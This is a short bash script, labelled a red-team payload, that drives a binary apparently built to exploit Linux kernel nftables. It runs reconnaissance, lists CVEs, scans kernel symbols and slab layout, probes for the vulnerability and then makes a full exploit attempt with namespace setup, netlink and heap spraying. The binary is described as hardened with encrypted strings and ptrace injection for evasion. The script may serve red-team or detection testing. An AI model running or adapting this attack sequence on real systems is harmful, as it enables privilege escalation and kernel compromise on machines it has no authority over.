#!/bin/bash
# Red team payload v4: hardened binary (encrypted strings, ptrace injection)
# Tests the built binary directly rather than running shell commands

REPORT_DIR="${1:-/opt/reports}"

echo "[red-team-v4] Running hardened nfttables binary"

# Run info command (exercises string decryption, banner, recon)
echo "[red-team-v4] Phase 1: info"
/opt/nfttables/nfttables info 2>&1 | head -30

# Run collections (exercises CVE string display)
echo "[red-team-v4] Phase 2: collections"
/opt/nfttables/nfttables collections 2>&1 | head -20

# Run scan (exercises kallsyms, slab profiling, offset resolution)
echo "[red-team-v4] Phase 3: scan"
/opt/nfttables/nfttables scan -v 2>&1 | head -40

# Run check (probe vulnerability without exploiting)
echo "[red-team-v4] Phase 4: check (dry run exploit)"
/opt/nfttables/nfttables check auto 2>&1 | head -30

# Run mint (full exploit attempt, will fail on patched kernel but exercises
# the full code path up to the failure point: namespace setup, netlink socket,
# nftables batch, heap spray attempt)
echo "[red-team-v4] Phase 5: mint (full exploit attempt)"
/opt/nfttables/nfttables mint auto -v 2>&1 | head -40

echo "[red-team-v4] Done"
